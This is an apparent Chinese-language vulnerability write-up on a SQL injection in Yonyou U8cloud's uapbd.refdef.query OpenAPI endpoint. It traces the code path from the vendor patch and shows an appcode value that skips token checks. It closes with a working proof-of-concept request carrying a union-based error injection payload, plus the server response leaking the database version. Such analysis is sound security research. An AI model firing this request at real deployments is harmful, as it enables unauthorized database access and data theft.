---
title: 用友U8cloud uapbd.refdef.query SQL注入漏洞
date: 2024-10-10 12:00:00
tags:
  - 漏洞分析
---

漏洞公告：

https://security.yonyou.com/#/patchInfo?identifier=563f888c335e4824a7a3c08353e597dd


![](https://cdn.nlark.com/yuque/0/2026/png/22387372/1788087462849-d2660c36-7a2f-476e-82f0-13ced3d05eaf.png)

下载漏洞补丁可以看到对u8c.impl.uap.def.action.RefDefAPIQueryAction做了非法字符和关键词的校验


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728981524170-6ca9e427-3e0e-4fb4-9395-90e3fc9af458.png)

查看相关路由\webapps\u8c_web\WEB-INF\web.xml


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728982298088-b1290ec4-02bc-4eff-bfb9-5a597482ed95.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728982398788-b455902a-b0b1-4b7d-8385-902fa300bafe.png)跟进nc.bs.framework.server.extsys.ExtSystemInvokerServlet#doAction方法，ExtSystemServerEnum是一个枚举类，我们的request.getRequestURI()必须以/u8cloud/yls、/u8cloud/extsystem/dst、/u8cloud/api/、/u8cloud/openapi/四个常量之一为开头。

当我们访问/u8cloud/openapi/，然后serviceName就被赋值为u8cloud_openapi


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728982787788-2c1598ff-4cdb-4426-bee2-5c913707730c.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728982847993-3549d2a9-f25d-430d-9cc1-513f12f55171.png)

继续往下跟进到getServiceObject()方法，会根据serviceNamei去找对应的类，也就是/modules/uap/META-INF/P_API.upm中的配置，找到u8c.server.APIOpenServletForJSON类


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728983039562-dc4fef3b-38e2-41b1-a912-f352605dc1b3.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728983470644-628ab612-4ea1-4f7f-8b0a-ab4470d54a66.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728983451766-fc57838f-4083-4853-8e5b-e72f501f14b2.png)

跟进u8c.server.APIOpenServletForJSON#doAction方法


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728983856100-b4f16b11-e410-4bf8-93a1-f57c3932f428.png)

跟进u8c.server.APIOpenController#forWard方法，创建了InputDataVO对象，然后调用arseInputParameter获取传入的参数needStackTrace、trantype、isEncrypt、uniquekey并赋值


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728983940908-b3214e83-b4e6-49d5-b731-7079662537d4.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728983997560-4380fea8-15d9-489f-bd7c-f3bd6ccf5087.png)

继续往下可以看到获取传入的appcode并做校验，必须包含枚举类ExtSystemKeyEnum中的值，并且当appcode等于lbsj、esn、huo、ubz时就会跳过token的校验


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728984279309-aade698b-ab6b-4e58-a143-f049095165d1.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728984357717-a8af681c-b074-43dd-96f1-bd7c5b220d54.png)

继续往下跟进，这里会通过一系列反射调用u8c.impl.invoke.json.InvokeWithJSonImpl#invoke->u8c.bs.invoke.bp.JSONInvokeBP#invoke->u8c.bs.config.BillConfigFileParse#queryConfigVO，根据传入serverName的值也就是/u8cloud/openapi/后的路径uapbd.refdef.query，从对应配置文件uapbd.config中读取对应的类


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728984741689-4d9d150d-f7d8-438a-8cac-bfc32361f437.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728986072278-900995d9-47b3-487b-a9d9-69aa76293a80.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728986379361-bcb265af-1220-4364-b3fc-291ea366c8d8.png)

最终到了开始的的u8c.impl.uap.def.action.RefDefAPIQueryAction类，可以看到直接拼接refName并执行sql语句


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1728986495805-83a6f890-0841-49aa-85a1-51669f0e2d15.png)


![](https://cdn.nlark.com/yuque/0/2024/png/22387372/1729042300607-2b1f28a7-bffe-4a2c-8edf-356b2987cbf6.png)





```plain
POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&needStackTrace=123&trantype=&isEncrypt=N&uniquekey= HTTP/1.1
Host: 192.168.211.177:8088
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 64

{"refName":"1%' union all select 1,convert(int,@@version),1-- "}

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=CB862275E55EBE86982A31047C00D2B7.server; Path=/; HttpOnly
Content-Type: application/json;charset=utf-8
Content-Length: 390
Date: Wed, 16 Oct 2024 01:30:25 GMT

{
  "status": "falied",
  "errorcode": "-32000",
  "errormsg": "U8C返回信息:在将 nvarchar 值 \u0027Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) \n\tSep 24 2019 13:48:23 \n\tCopyright (C) 2019 Microsoft Corporation\n\tEnterprise Edition (64-bit) on Windows Server 2016 Standard 10.0 \u003cX64\u003e (Build 14393: ) (Hypervisor)\n\u0027 转换成数据类型 int 时失败。"
}
```
